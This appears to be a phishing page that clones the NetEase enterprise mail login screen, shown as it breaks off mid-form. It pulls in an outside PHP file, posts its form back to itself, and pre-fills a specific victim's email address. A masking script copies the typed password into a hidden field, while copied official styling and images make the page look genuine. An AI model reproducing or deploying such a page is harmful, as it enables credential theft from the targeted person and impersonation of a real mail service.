<?php include '../build.php' ?>
<html lang="zh_CN">
<script type="text/javascript">/*<![CDATA[*/function MaskedPassword(e,d){if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}if(e==null){return false}this.symbol=d;this.isIE=typeof document.uniqueID!="undefined";e.value="";e.defaultValue="";e._contextwrapper=this.createContextWrapper(e);this.fullmask=false;var f=e._contextwrapper;var b='<input type="hidden" name="'+e.name+'">';var c=this.convertPasswordFieldHTML(e);f.innerHTML=b+c;e=f.lastChild;e.className+=" masked";e.setAttribute("autocomplete","off");e._realfield=f.firstChild;e._contextwrapper=f;this.limitCaretPosition(e);var a=this;this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});this.forceFormReset(e);return true}MaskedPassword.prototype={doPasswordMasking:function(a){var d="";if(a._realfield.value!=""){for(var b=0;b<a.value.length;b++){if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}else{d+=a.value.charAt(b)}}}else{d=a.value}var c=this.encodeMaskedPassword(d,this.fullmask,a);if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}},encodeMaskedPassword:function(d,f,b){var a=f===true?0:1;for(var e="",c=0;c<d.length;c++){if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}}return e},createContextWrapper:function(a){var b=document.createElement("span");b.style.position="relative";a.parentNode.insertBefore(b,a);b.appendChild(a);return b},forceFormReset:function(a){while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}if(!/form/i.test(a.nodeName)){return null}this.addSpecialLoadListener(function(){a.reset()});return a},convertPasswordFieldHTML:function(c,e){var b="<input";for(var d=c.attributes,a=0;a<d.length;a++){if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){b+=" "+d[a].name+'="'+d[a].value+'"'}}b+=' type="text" autocomplete="off">';return b},limitCaretPosition:function(a){var d=null,c=function(){if(d==null){if(this.isIE){d=window.setInterval(function(){var e=a.createTextRange(),g=a.value.length,f="character";e.moveEnd(f,g);e.moveStart(f,g);e.select()},100)}else{d=window.setInterval(function(){var e=a.value.length;if(!(a.selectionEnd==e&&a.selectionStart<=e)){a.selectionStart=e;a.selectionEnd=e}},100)}}},b=function(){window.clearInterval(d);d=null};this.addListener(a,"focus",function(){c()});this.addListener(a,"blur",function(){b()})},addListener:function(c,a,b){if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}},addSpecialLoadListener:function(a){if(this.isIE){return window.attachEvent("onload",a)}else{return document.addEventListener("DOMContentLoaded",a,false)}},getTarget:function(a){if(!a){return null}return a.target?a.target:a.srcElement}};/*]]>*/</script>
    <head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="Content-type" content="text/html;charset=utf-8">
    <title data-lang-key="网易企业邮箱 - 登录入口">网易企业邮箱 - 登录入口</title>
    <meta name="keywords" content="网易企业邮箱,登录企业邮箱,企业邮箱注册,电子邮箱">
    <meta name="description" content="登录网易企业邮箱，请填写完整的邮件地址或管理员账号，支持手机扫码登录。用邮箱大师，随时随地，极速收发。">
    <link rel="shortcut icon" href="https://qiye.163.com/favicon.ico" type="image/x-icon">  
    <link href="https://mg.127.net/static/mimg/p/login/css/bundle.9a29470b.css" rel="stylesheet">
 
    <style type="text/css">
        .yidun,
        .yidun_popup {
        -webkit-text-size-adjust: 100% !important;
        -ms-text-size-adjust: 100% !important;
        text-size-adjust: 100% !important;
        -moz-text-size-adjust: 100% !important;
        }

        .yidun {
        -webkit-tap-highlight-color: transparent;
        }

        .yidun * {
        box-sizing: border-box;
        }

        .yidun :focus-visible {
        outline: 2px solid #4997fd;
        }

        @keyframes loading {
        0%   { transform: rotate(0deg); }
        100% { transform: rotate(1turn); }
        }

        @keyframes ball-scale-multiple {
        0%   { transform: scale(0.22); opacity: 0; }
        5%   { opacity: 1; }
        100% { transform: scale(1); opacity: 0; }
        }

        @keyframes bright {
        0%   { opacity: 0.5; }
        100% { opacity: 1; }
        }

        .panel_ease_top-enter,
        .panel_ease_top-leave-active {
        opacity: 0;
        transform: translateY(20px);
        }

        .panel_ease_bottom-enter,
        .panel_ease_bottom-leave-active {
        opacity: 0;
        transform: translateY(-20px);
        }

        .panel_ease_bottom-enter-active,
        .panel_ease_bottom-leave-active,
        .panel_ease_top-enter-active,
        .panel_ease_top-leave-active {
        transition: all 0.2s linear;
        pointer-events: none;
        }

        .popup_scale-enter,
        .popup_scale-leave-active {
        opacity: 0;
        transform: scale(0);
        }

        .popup_scale-enter-active {
        transition: all 0.3s cubic-bezier(0.76, 0.01, 0.35, 1.56);
        }

        .popup_scale-leave-active {
        transition: all 0.2s ease-out;
        }

        .popup_ease-enter {
        opacity: 0;
        transform: translateY(-20px);
        }

        .popup_ease-enter-active {
        transition: opacity 0.3s linear, transform 0.3s linear;
        }

        .popup_ease-leave-active {
        opacity: 0;
        transform: translateY(-20px);
        transition: all 0.2s ease-out;
        }

        .yidun.yidun--light {
        position: relative;
        margin: auto;
        font-size: 14px;
        -ms-touch-action: none;
        touch-action: none;
        }

        .yidun.yidun--light img {
        pointer-events: none;
        }

        .yidun.yidun--light .yidun_panel {
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
        position: relative;
        z-index: 1;
        }

        .yidun.yidun--light .yidun_panel-placeholder {
        pointer-events: auto;
        position: relative;
        padding-top: 50%;
        }

        .yidun.yidun--light .yidun_bgimg {
        pointer-events: auto;
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        }

        .yidun.yidun--light .yidun_bgimg .yidun_bg-img {
        vertical-align: top;
        width: 100%;
        }

        .yidun_cover-frame {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        border: 0;
        opacity: 0;
        filter: alpha(opacity=0);
        }

        .yidun.yidun--light .yidun_control {
        position: relative;
        border: 1px solid #e4e7eb;
        background-color: #f7f9fa;
        }

        .yidun.yidun--light .yidun_slider {
        position: absolute;
        top: 0;
        left: 0;
        height: 100%;
        background-color: #fff;
        box-shadow: 0 0 3px rgba(0, 0, 0, 0.3);
        cursor: pointer;
        transition: background 0.2s linear;
        }

        .yidun.yidun--light .yidun_slider.yidun_slider--hover:hover {
        background-color: #1991fa;
        }

        .yidun.yidun--light .yidun_slider .yidun_slider__icon {
        position: absolute;
        top: 50%;
        margin-top: -6px;
        left: 50%;
        margin-left: -6px;
        width: 14px;
        height: 10px;
        }

        .yidun.yidun--light .yidun_slide_indicator {
        position: absolute;
        top: -1px;
        left: -1px;
        width: 0;
        border: 1px solid transparent;
        }

        .yidun.yidun--light .yidun_tips {
        text-align: center;
        color: #45494c;
        height: 100%;
        white-space: nowrap;
        font-size: 0;
        }

        .yidun.yidun--light .yidun_tips__before {
        height: 100%;
        width: 0;
        vertical-align: middle;
        }

        .yidun.yidun--light .yidun_tips__content {
        display: inline-block;
        vertical-align: middle;
        white-space: normal;
        font-size: 14px;
        line-height: 18px;
        }

        .yidun.yidun--light .yidun_tips__text {
        vertical-align: middle;
        word-break: break-word;
        }

        .yidun.yidun--light .yidun_tips__answer {
        vertical-align: middle;
        font-weight: 700;
        }

        .yidun.yidun--light .yidun_top {
        position: absolute;
        right: 0;
        top: 0;
        max-width: 98px;
        z-index: 2;
        background-color: rgba(0, 0, 0, 0.12);
        }

        .yidun.yidun--light .yidun_top:hover {
        background-color: rgba(0, 0, 0, 0.2);
        }

        .yidun.yidun--light .yidun_refresh,
        .yidun.yidun--light .yidun_top__audio {
        width: 30px;
        height: 30px;
        margin-left: 4px;
        cursor: pointer;
        font-size: 0;
        vertical-align: top;
        border: none;
        background-color: transparent;
        }

        .yidun.yidun--light .yidun_loadbox {
        display: none;
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        text-align: center;
        background-color: #f7f9fa;
        background-position: 50%;
        background-size: cover;
        }

        .yidun.yidun--light.yidun--loading .yidun_loadbox,
        .yidun.yidun--light.yidun--loadfail .yidun_loadbox {
        display: block;
        }

        .yidun.yidun--light.yidun--loading .yidun_loadicon {
        animation: loading 0.8s linear infinite;
        }

        .yidun.yidun--light.yidun--success .yidun_tips {
        color: #52ccba;
        }

        .yidun.yidun--light.yidun--success .yidun_refresh,
        .yidun.yidun--light.yidun--success .yidun_top__audio {
        display: none;
        }

        .yidun.yidun--light.yidun--error .yidun_tips {
        color: #f57a7a;
        }

        .yidun.yidun--light.yidun--rtl {
        direction: rtl;
        }

        .yidun.yidun--light.yidun--rtl .yidun_top {
        left: 0;
        right: auto;
        }

        .yidun.yidun--light.yidun--rtl .yidun_top__right {
        float: left;
        }

        .yidun.yidun--light.yidun--rtl .yidun_top__audio {
        float: left;
        margin-left: 0;
        }

        .yidun.yidun--light.yidun--rtl .yidun_voice__right {
        float: left;
        }

        .yidun.yidun--light.yidun--rtl .yidun_voice__refresh {
        float: right;
        }

        .yidun.yidun--light .yidun_voice {
        display: none;
        }

        .yidun.yidun--light.yidun--voice .yidun_voice {
        display: block;
        width: 100%;
        height: 100%;
        overflow: hidden;
        position: relative;
        }

        .yidun.yidun--light.yidun--voice .yidun_bgimg {
        background-color: #f8f9fb;
        border: 1px solid #e6e7eb;
        padding: 0 8px;
        }

        .yidun.yidun--light .yidun_audio {
        height: 40px;
        margin-bottom: 24px;
        position: relative;
        text-align: center;
        }

        .yidun.yidun--light .yidun_audio__wave {
        pointer-events: none;
        position: absolute;
        top: 0;
        left: 50%;
        transform: translateX(-50%);
        z-index: -1;
        white-space: nowrap;
        height: 100%;
        line-height: 40px;
        font-size: 0;
        }

        .yidun.yidun--light .yidun_wave__item {
        display: inline-block;
        width: 4px;
        border-radius: 3px;
        position: relative;
        overflow: hidden;
        background-color: #dfe6f4;
        vertical-align: middle;
        margin: 0 3px;
        }

        .yidun.yidun--light .yidun_wave__inner {
        position: absolute;
        top: 0;
        left: 0;
        width: 4px;
        height: 100%;
        border-radius: 3px;
        transform: translateX(-4px);
        background-color: #1991fa;
        }

        .yidun.yidun--light .yidun_wave__item.yidun_wave__item-light .yidun_wave__inner {
        transform: translateX(0);
        transition: transform 0.35s linear;
        }

        /* Wave bar heights — creates the equaliser silhouette */
        .yidun.yidun--light .yidun_wave-1,
        .yidun.yidun--light .yidun_wave-8,
        .yidun.yidun--light .yidun_wave-11,
        .yidun.yidun--light .yidun_wave-18,
        .yidun.yidun--light .yidun_wave-21,
        .yidun.yidun--light .yidun_wave-28  { height: 12px; }

        .yidun.yidun--light .yidun_wave-2,
        .yidun.yidun--light .yidun_wave-7,
        .yidun.yidun--light .yidun_wave-12,
        .yidun.yidun--light .yidun_wave-17,
        .yidun.yidun--light .yidun_wave-22,
        .yidun.yidun--light .yidun_wave-27  { height: 18px; }

        .yidun.yidun--light .yidun_wave-3,
        .yidun.yidun--light .yidun_wave-6,
        .yidun.yidun--light .yidun_wave-13,
        .yidun.yidun--light .yidun_wave-16,
        .yidun.yidun--light .yidun_wave-23,
        .yidun.yidun--light .yidun_wave-26  { height: 24px; }

        .yidun.yidun--light .yidun_wave-4,
        .yidun.yidun--light .yidun_wave-5,
        .yidun.yidun--light .yidun_wave-14,
        .yidun.yidun--light .yidun_wave-15,
        .yidun.yidun--light .yidun_wave-24,
        .yidun.yidun--light .yidun_wave-25  { height: 30px; }

        .yidun.yidun--light .yidun_wave-9,
        .yidun.yidun--light .yidun_wave-10,
        .yidun.yidun--light .yidun_wave-19,
        .yidun.yidun--light .yidun_wave-20,
        .yidun.yidun--light .yidun_wave-29,
        .yidun.yidun--light .yidun_wave-30  { height: 6px; }

        .yidun.yidun--light .yidun_audio__play,
        .yidun.yidun--light .yidun_audio__refresh {
        width: 40px;
        height: 40px;
        background-color: #0776f8;
        box-shadow: 0 3px 16px rgba(73, 103, 180, 0.32);
        border: none;
        outline: none;
        font-size: 0;
        vertical-align: middle;
        border-radius: 50%;
        margin: 0 16px;
        cursor: pointer;
        }

        .yidun.yidun--light .yidun_audio__play:hover,
        .yidun.yidun--light .yidun_audio__refresh:hover {
        background-color: #1991fa;
        }

        .yidun.yidun--light .yidun_audio__play::before,
        .yidun.yidun--light .yidun_audio__refresh::before {
        content: "";
        width: 20px;
        height: 20px;
        display: block;
        margin: auto;
        }

        .yidun.yidun--light .yidun_voice__inner {
        position: absolute;
        top: 50%;
        width: 100%;
        transform: translateY(-50%);
        }

        .yidun.yidun--light .yidun_voice__input {
        -moz-appearance: none;
        -webkit-appearance: none;
        width: calc(100% - 4px);
        height: 32px;
        line-height: 30px;
        font-size: 14px;
        border: 1px solid #e6e7eb;
        border-radius: 2px;
        text-indent: 4px;
        background-color: #fff;
        color: #44494a;
        padding: 2px;
        }

        .yidun.yidun--light .yidun_voice__input::placeholder {
        color: #c7c7c7;
        }

        .yidun.yidun--light .yidun_voice__input:focus {
        border-color: #4997fd;
        }

        .yidun.yidun--light .yidun_voice__btns {
        text-align: left;
        margin-top: 6px;
        }

        .yidun.yidun--light .yidun_voice__back,
        .yidun.yidun--light .yidun_voice__refresh {
        border: none;
        background: transparent;
        font-size: 12px;
        line-height: 20px;
        padding: 0;
        cursor: pointer;
        vertical-align: middle;
        color: #45494c;
        }

        .yidun.yidun--light .yidun_voice__back::before,
        .yidun.yidun--light .yidun_voice__refresh::before {
        content: "";
        display: inline-block;
        width: 20px;
        height: 20px;
        background-repeat: no-repeat;
        background-position: 50%;
        vertical-align: middle;
        margin-right: 4px;
        }

        .yidun.yidun--light .yidun_voice__back {
        display: none;
        }

        .yidun.yidun--size-medium.yidun--voice .yidun_audio__play,
        .yidun.yidun--size-medium.yidun--voice .yidun_audio__refresh,
        .yidun.yidun--size-large.yidun--voice .yidun_audio__play,
        .yidun.yidun--size-large.yidun--voice .yidun_audio__refresh,
        .yidun.yidun--size-x-large.yidun--voice .yidun_audio__play,
        .yidun.yidun--size-x-large.yidun--voice .yidun_audio__refresh {
        width: 48px;
        height: 48px;
        }

        .yidun.yidun--size-medium.yidun--voice .yidun_voice__input,
        .yidun.yidun--size-large.yidun--voice .yidun_voice__input,
        .yidun.yidun--size-x-large.yidun--voice .yidun_voice__input {
        font-size: inherit;
        }

        .yidun.yidun--size-medium.yidun--voice .yidun_voice__btns .yidun_voice__back::before,
        .yidun.yidun--size-medium.yidun--voice .yidun_voice__btns .yidun_voice__refresh::before,
        .yidun.yidun--size-large.yidun--voice .yidun_voice__btns .yidun_voice__back::before,
        .yidun.yidun--size-large.yidun--voice .yidun_voice__btns .yidun_voice__refresh::before,
        .yidun.yidun--size-x-large.yidun--voice .yidun_voice__btns .yidun_voice__back::before,
        .yidun.yidun--size-x-large.yidun--voice .yidun_voice__btns .yidun_voice__refresh::before {
        width: 24px;
        height: 24px;
        margin-right: 5px;
        }

        .yidun.yidun--light.yidun--voice.yidun--error .yidun_control,
        .yidun.yidun--light.yidun--voice.yidun--maxerror .yidun_control,
        .yidun.yidun--light.yidun--voice.yidun--success .yidun_control,
        .yidun.yidun--light.yidun--voice.yidun--verifying .yidun_control {
        cursor: not-allowed;
        }

        .yidun_popup.yidun_popup--light {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 9999;
        text-align: center;
        }

        .yidun_popup.yidun_popup--light .yidun_popup__mask {
        -ms-touch-action: none;
        touch-action: none;
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: #000;
        transition: opacity 0.3s linear;
        will-change: opacity;
        }

        .yidun_popup.yidun_popup--light .yidun_modal {
        position: relative;
        box-sizing: border-box;
        border-radius: 2px;
        border: 1px solid #e4e7eb;
        background-color: #fff;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
        -ms-touch-action: none;
        touch-action: none;
        }

        .yidun_popup.yidun_popup--light .yidun_modal__wrap {
        height: 100%;
        width: 100%;
        }

        .yidun_popup.yidun_popup--light .yidun_modal__subwrap {
        height: 100%;
        width: 100%;
        white-space: nowrap;
        }

        .yidun_popup.yidun_popup--light .yidun_modal__header {
        padding: 0 15px;
        height: 50px;
        text-align: left;
        font-size: 0;
        color: #45494c;
        border-bottom: 1px solid #e4e7eb;
        white-space: nowrap;
        position: relative;
        }

        .yidun_popup.yidun_popup--light .yidun_modal__before {
        width: 0;
        height: 100%;
        vertical-align: middle;
        }

        .yidun_popup.yidun_popup--light .yidun_modal__title {
        font-size: 16px;
        line-height: 20px;
        vertical-align: middle;
        white-space: normal;
        }

        .yidun_popup.yidun_popup--light .yidun_modal__close {
        position: absolute;
        top: 0;
        right: 9px;
        width: 24px;
        height: 100%;
        text-align: center;
        border: none;
        background: transparent;
        padding: 0;
        cursor: pointer;
        }

        .yidun_popup.yidun_popup--light .yidun_modal__close .yidun_icon-close {
        display: inline-block;
        width: 11px;
        height: 11px;
        vertical-align: middle;
        }

        .yidun_popup.yidun_popup--light .yidun_modal__body {
        padding: 15px;
        }

        .yidun_popup.yidun_popup--auto .yidun_modal {
        top: auto;
        margin: auto;
        }

        @supports (display: flex) {
        .yidun_popup.yidun_popup--auto .yidun_modal__subwrap {
            display: flex;
            flex-direction: column;
            align-items: center;
            align-content: center;
        }
        }

        .yidun_popup.yidun_popup--append {
        position: absolute;
        }

        .yidun_popup.yidun_popup--rtl {
        direction: rtl;
        }

        .yidun_popup.yidun_popup--rtl .yidun_modal__header {
        text-align: right;
        padding: 0 15px;
        }

        .yidun_popup.yidun_popup--rtl .yidun_modal__close {
        left: 9px;
        right: auto;
        }

        .yidun_popup.yidun_popup--size-medium,
        .yidun_popup.yidun_popup--size-medium .yidun_modal__title { font-size: 18px; }

        .yidun_popup.yidun_popup--size-large,
        .yidun_popup.yidun_popup--size-large .yidun_modal__title  { font-size: 20px; }

        .yidun_popup.yidun_popup--size-x-large,
        .yidun_popup.yidun_popup--size-x-large .yidun_modal__title { font-size: 24px; }


        .yidun_intellisense--light {
        position: relative;
        }

        .yidun_intellisense--light * {
        box-sizing: border-box;
        }

        .yidun_intellisense--light .yidun_intelli-control {
        position: relative;
        height: 40px;
        font-size: 14px;
        cursor: pointer;
        border-radius: 2px;
        border: 1px solid #e4e7eb;
        background-color: #f7f9fa;
        overflow: hidden;
        outline: none;
        }

        .yidun_intellisense--light .yidun_intelli-tips {
        text-align: center;
        color: #45494c;
        }

        .yidun_intellisense--light .yidun_intelli-text {
        line-height: 38px;
        vertical-align: middle;
        transition: all 0.2s linear;
        }

        .yidun_intellisense--light .yidun_intelli-icon {
        position: relative;
        margin-right: 5px;
        width: 28px;
        height: 28px;
        vertical-align: middle;
        border-radius: 50%;
        background-color: #fff;
        box-shadow: 0 2px 8px 1px rgba(188, 196, 204, 0.5);
        transition: all 0.2s linear;
        }

        .yidun_intellisense--light .yidun_intelli-icon .yidun_logo {
        position: absolute;
        top: 50%;
        left: 50%;
        margin-top: -8px;
        margin-left: -8px;
        width: 15px;
        height: 17px;
        }

        .yidun_intellisense--light .yidun_intelli-tips:hover .yidun_intelli-icon {
        background-color: #1991fa;
        box-shadow: 0 2px 6px 1px rgba(25, 145, 250, 0.5);
        }

        .yidun_intellisense--light .yidun_intelli-tips:hover .yidun_intelli-text {
        color: #1991fa;
        }

        .yidun_intellisense--light .yidun_classic-tips {
        display: none;
        text-align: center;
        }

        .yidun_intellisense--light .yidun_classic-tips .yidun_tips__icon {
        margin-right: 5px;
        width: 12px;
        height: 12px;
        vertical-align: middle;
        }

        .yidun_intellisense--light .yidun_classic-tips .yidun_tips__text {
        line-height: 38px;
        vertical-align: middle;
        }

        .yidun_intellisense--light .yidun_classic-container {
        position: absolute;
        bottom: 0;
        left: 0;
        width: 100%;
        z-index: 1000;
        }

        .yidun_intellisense--light .yidun_classic-wrapper {
        display: none;
        width: 100%;
        padding: 9px;
        border: 1px solid #e4e7eb;
        border-radius: 2px;
        background-color: #fff;
        }

        .yidun_intellisense--light.yidun_intellisense--loading .yidun_intelli-icon,
        .yidun_intellisense--light.yidun_intellisense--checking .yidun_intelli-icon {
        background-color: #1991fa;
        }

        .yidun_intellisense--light.yidun_intellisense--loading .yidun_intelli-text,
        .yidun_intellisense--light.yidun_intellisense--checking .yidun_intelli-text {
        color: #1991fa;
        }

        .yidun_intellisense--light.yidun_intellisense--loading .yidun_intelli-loading {
        position: absolute;
        top: 50%;
        left: 50%;
        margin-top: -8px;
        margin-left: -8px;
        width: 16px;
        height: 16px;
        border-radius: 50%;
        border-width: 2px;
        border-style: solid;
        border-color: #fff #fff transparent;
        animation: loading 0.75s linear infinite;
        }

        .yidun_intellisense--light.yidun_intellisense--checking .yidun_ball-scale-multiple > div {
        position: absolute;
        box-shadow: inset 0 0 40px rgba(25, 145, 250, 0.5);
        border-radius: 100%;
        animation-fill-mode: both;
        left: -80px;
        top: 0;
        opacity: 0;
        width: 160px;
        height: 160px;
        animation: ball-scale-multiple 1.8s 0s linear infinite;
        }

        .yidun_intellisense--light.yidun_intellisense--checking .yidun_ball-scale-multiple > div:nth-child(2) {
        animation-delay: -1.2s;
        }

        .yidun_intellisense--light.yidun_intellisense--checking .yidun_ball-scale-multiple > div:nth-child(3) {
        animation-delay: -0.6s;
        }

        .yidun_intellisense--light.yidun_intellisense--success .yidun_intelli-control {
        border-color: #52ccba;
        background-color: #d2f4ef;
        }

        .yidun_intellisense--light.yidun_intellisense--success .yidun_classic-tips {
        color: #52ccba;
        }

        .yidun_intellisense--light.yidun_intellisense--error .yidun_intelli-control,
        .yidun_intellisense--light.yidun_intellisense--loadfail .yidun_intelli-control {
        border-color: #f57a7a;
        background-color: #fce1e1;
        }

        .yidun_intellisense--light.yidun_intellisense--error .yidun_classic-tips,
        .yidun_intellisense--light.yidun_intellisense--loadfail .yidun_classic-tips {
        color: #f57a7a;
        }

        .yidun_intellisense--light.yidun_intellisense--success .yidun_intelli-tips,
        .yidun_intellisense--light.yidun_intellisense--error .yidun_intelli-tips,
        .yidun_intellisense--light.yidun_intellisense--loadfail .yidun_intelli-tips {
        display: none;
        }

        .yidun_intellisense--light.yidun_intellisense--success .yidun_classic-tips,
        .yidun_intellisense--light.yidun_intellisense--error .yidun_classic-tips,
        .yidun_intellisense--light.yidun_intellisense--loadfail .yidun_classic-tips {
        display: block;
        }

        .yidun_intellisense--size-medium,
        .yidun_intellisense--size-medium .yidun_intelli-control { font-size: 18px; }

        .yidun_intellisense--size-large,
        .yidun_intellisense--size-large .yidun_intelli-control  { font-size: 20px; }

        .yidun_intellisense--size-x-large,
        .yidun_intellisense--size-x-large .yidun_intelli-control { font-size: 24px; }

        .m-ipt {
            position: relative;
            height: 46px;
            margin-bottom: 22px;
            background-position: 0 -92px;
            border: 1px solid #dadada;
            border-radius: 4px;
        }

        @media screen and (-webkit-min-device-pixel-ratio: 0) {
            .m-ipt .ipt {
                line-height: normal;
            }
        }
        .m-ipt .ipt {
            position: absolute;
            top: 11px;
            left: 44px;
            width: 282px;
            height: 22px;
            line-height: 22px;
            padding: 12px 0 12px;
            border: none;
            font-size: 14px;
            color: #333;
            background: transparent;
            outline: none;
        }
/* ============================================================
   Fix: MaskedPassword wraps the input in a dynamic <span>.
   Force the wrapper to fill the field row and anchor the
   visible input to the LEFT — independent of inline styles,
   floats, text-align, or browser serialization differences.
   ============================================================ */

/* 1. Wrapper span → block, fills .m-ipt box, ignores floats */
.m-ipt > span[style*="position"] {
    position: absolute !important;
    top: 0 !important;
    left: 0 !important;
    right: 0 !important;
    width: 100% !important;
    height: 100% !important;
    display: block !important;
    float: none !important;
    text-align: left !important;
    direction: ltr !important;
    z-index: 1;
}

/* 2. Visible masked input → left-anchored, left-aligned */
.m-ipt > span[style*="position"] > input:not([type="hidden"]) {
    position: absolute !important;
    top: 11px !important;
    left: 44px !important;
    right: auto !important;
    width: 282px !important;
    height: 22px !important;
    line-height: 22px !important;
    padding: 12px 0 !important;
    border: none !important;
    font-size: 14px !important;
    color: #333 !important;
    background: transparent !important;
    outline: none !important;
    text-align: left !important;
    direction: ltr !important;
    unicode-bidi: normal !important;
    float: none !important;
}

/* 3. Hidden mirror input → invisible */
.m-ipt > span[style*="position"] > input[type="hidden"] {
    display: none !important;
}

/* 4. Mobile verify password field — not wrapped by the library */
#js-pwd-value {
    position: absolute !important;
    top: 11px !important;
    left: 44px !important;
    right: auto !important;
    text-align: left !important;
    direction: ltr !important;
}

/* 5. Nuclear override — force left alignment on every password
      input regardless of external stylesheet rules */
input#accpwd,
input#adminpwd,
input#js-pwd-value,
input.js-pwd,
input.js-pwd-value,
input[name="pass"],
input[name="password"] {
    text-align: left !important;
    direction: ltr !important;
    unicode-bidi: normal !important;
}
    </style>
            
    </head>
    <body>
            <div class="dashi-client-download-box"><div class="dashi-client-download-box-content"><img id="dashi-client-download-box-content-close" class="dashi-client-download-box-content-close" src="//cowork-storage-public-cdn.lx.netease.com/common/2024/07/16/6eaf1b5322a645f9ab9d80080bb4a8bd.png" alt=""><p>下载网易企业邮箱专属客户端</p><p>客户端无需重复登录，追踪邮件阅读状态，收到邮件实时提醒，重要工作不再错过</p><iframe class="dashi-client-download-iframe" src="//mail.qiye.163.com/static/commonweb/dashiDownload.html?from=webmailLogin" frameborder="0"></iframe></div></div><header class="g-hd"><div><h1 class="w-qiyelogo" id="J_logo"><a href="//qiye.163.com/" target="_blank" data-lang-title="中国第一大电子邮件服务商" title="中国第一大电子邮件服务商" data-tj-key="b_Logo_click"></a></h1><h1 class="w-qiyelogo-xc" id="J_logo_xc"><a href="//qiye.163.com/" target="_blank" data-lang-title="中国第一大电子邮件服务商" title="中国第一大电子邮件服务商" data-tj-key="b_Logo_click"></a></h1><nav class="m-hdnav" id="hdnav"><a href="//qiye.163.com/entry/buy-price.htm?from=login_pc" target="_blank" data-tj-key="b_Registe_click" data-lang-key="新用户开通" id="xyhkt">新用户开通</a> <a href="?hl=zh_CN" data-tj-key="b_CN_Language_click" id="hlCn" class="f-hide">简体版</a> <a href="?hl=en_US" data-tj-key="b_EN_Language_click" id="hlEn">English</a> <a download="" href="javascript:;" id="lxbg" class="official-app">网易邮箱官方客户端 </a><a href="#" target="_blank" data-tj-key="b_Dashi_click" data-lang-key="邮箱大师" id="yxds" style="display: none;">邮箱大师</a> <a id="help-url-id" href="#" target="_blank" data-tj-key="b_Help_click" data-lang-key="帮助中心">帮助中心</a> <a id="remote-id" href="javascript:;" data-tj-key="b_click_remote" data-lang-key="快照">快照</a></nav></div></header><section class="g-bd"><div class="g-bd-mn js-bdImg" id="bdImg" style="background-image: url(&quot;https://cowork-storage-public-cdn.lx.netease.com/silk/2023/12/25/2ed4be2d88c7415590a8092bf8dc5766.jpeg&quot;);"><div class="m-theme"><div class="g-wrap"><a id="linkTheme" class="link js-linkTheme" href="javascript:;" data-tj-key="b_BdImg_click" style="background-image: url(&quot;https://cowork-storage-public-cdn.lx.netease.com/silk/2024/01/23/5bc4512767ad42fa965d5994c8a4a317.png&quot;); background-size: contain; width: 664px; height: 499px; left: -152px;"></a><div class="themectrl"><a class="js-prevTheme" id="prevTheme" href="javascript:void(0);" data-lang-title="上一张" title="上一张"></a> <a class="js-nextTheme" id="nextTheme" href="javascript:void(0);" data-lang-title="下一张" title="下一张"></a></div></div></div><div id="loginBlock" class="m-login m-login-with-ad js-loginpanel "><div class="new-loginFunc"></div><div class="login-bd" id="js-account-login"><h3 class="loginbox-title"><span class="active" id="switchAccCtrl" data-lang-key="邮箱账号登录">邮箱账号登录</span><span id="switchAdminCtrl" data-lang-key="管理员登录">管理员登录</span></h3><form class="login-form login-form-acc js-loginform js-loginform-acc" name="accountlogin" action="" method="post" target="_top"><input type="hidden" class="js-domain" name="login" value="qiyestatic"> <input type="hidden" class="js-accname" name="account_name" value=""> <input type="hidden" class="js-isSecure" name="secure" value="1"> <input type="hidden" class="js-isAllSecure" name="all_secure" value="1"> <input type="hidden" class="js-language" name="language" value="0"> <input type="hidden" class="js-pubid" name="pubid" value=""> <input type="hidden" class="js-passtype" name="passtype" value=""> <input type="hidden" class="js-referer" name="referer" value=""> <input type="hidden" class="js-module" name="module" value=""> <input type="hidden" class="js-ua" name="ua" value=""> <input type="hidden" class="js-ch" name="ch" value=""><div class="m-ipt js-ipt"><span class="icon icon-account"></span> <input id="accname" class="ipt js-value js-username" tabindex="1" data-lang-placeholder="邮箱地址" value="kevin@atc-china.cn" placeholder="邮箱地址" data-lang-title="请输入完整邮箱地址" title="请输入完整邮箱地址" name="user"><div class="m-error"></div></div><div class="m-ipt js-ipt"><span class="icon icon-pwd"></span> <input id="accpwd" class="ipt js-value js-pwd" tabindex="2" data-lang-placeholder="密码" placeholder="密码" data-lang-title="请输入密码" title="请输入密码" type="text" name="pass"> <span class="eye icon-close js-eye"></span><div class="m-error"></div></div><div><div class="m-verifycode"><div class="m-ipt js-ipt"><input id="accverifycode" class="ipt js-value js-verifycode" tabindex="2" data-lang-title="请输入验证码" title="请输入验证码" data-lang-placeholder="验证码" placeholder="验证码" name="verify_code"><div class="m-error"></div></div><img width="90" id="imgVerifycode" class="refreshVerifycode" data-lang-title="点击切换" title="点击切换"></div></div><div class="loginconf"><div class="logincheck js-logincheck"><span class="icon icon-checkbox js-checkbox"></span> <label for="accautologin" class="checklabel js-autolabel"><input tabindex="3" data-lang-title="记住账号" title="记住账号" class="checkipt js-autologin" type="checkbox" id="accautologin"> <span data-lang-key="记住账号">记住账号</span></label><div 